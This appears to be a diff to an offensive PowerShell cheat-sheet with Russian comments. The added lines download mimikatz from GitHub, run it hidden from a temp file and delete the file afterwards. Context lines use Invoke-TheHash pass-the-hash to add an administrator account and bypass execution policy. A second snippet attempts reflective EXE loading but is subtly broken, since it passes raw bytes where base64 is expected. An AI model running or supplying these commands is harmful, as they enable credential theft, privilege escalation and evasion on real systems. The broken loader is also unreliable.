@@ -248,3 +248,72 @@ Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1
 Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators max /add"
 
+# Запуск exe файл из Powershell
+
+# URL для загрузки файла
+$url = "https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe"
+
+# Загрузка файла в память
+$webClient = New-Object System.Net.WebClient
+$exeBytes = $webClient.DownloadData($url)
+
+# Создание временного файла для сохранения загруженного EXE
+$tempFilePath = [System.IO.Path]::GetTempFileName()
+[System.IO.File]::WriteAllBytes($tempFilePath, $exeBytes)
+
+# Запуск процесса
+$processInfo = New-Object System.Diagnostics.ProcessStartInfo
+$processInfo.FileName = $tempFilePath
+$processInfo.UseShellExecute = $false
+$processInfo.RedirectStandardOutput = $true
+$processInfo.RedirectStandardError = $true
+$processInfo.CreateNoWindow = $true
+
+# Запуск процесса
+$process = [System.Diagnostics.Process]::Start($processInfo)
+
+# Ожидание завершения процесса
+$process.WaitForExit()
+
+# Вывод стандартного вывода и ошибок
+$output = $process.StandardOutput.ReadToEnd()
+$error = $process.StandardError.ReadToEnd()
+
+Write-Output $output
+Write-Error $error
+
+# Удаление временного файла
+Remove-Item -Path $tempFilePath
+*****************************************************************************************************************
+
+# Загрузка exe файла с диска
+
+# Путь к EXE-файлу
+$exePath = "C:\path\to\your\file.exe"
+
+# Чтение содержимого EXE-файла в массив байтов
+$exeBytes = [System.IO.File]::ReadAllBytes($exePath)
+
+# Создание нового процесса
+$processInfo = New-Object System.Diagnostics.ProcessStartInfo
+$processInfo.FileName = "cmd.exe"
+$processInfo.Arguments = "/c echo $exeBytes | powershell -NoProfile -ExecutionPolicy Bypass -Command { [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($exeBytes)) }"
+$processInfo.RedirectStandardOutput = $true
+$processInfo.RedirectStandardError = $true
+$processInfo.UseShellExecute = $false
+$processInfo.CreateNoWindow = $true
+
+# Запуск процесса
+$process = [System.Diagnostics.Process]::Start($processInfo)
+
+# Ожидание завершения процесса
+$process.WaitForExit()
+
+# Вывод стандартного вывода и ошибок
+$output = $process.StandardOutput.ReadToEnd()
+$error = $process.StandardError.ReadToEnd()
+
+Write-Output $output
+Write-Error $error
+
+********************************************************************************************************
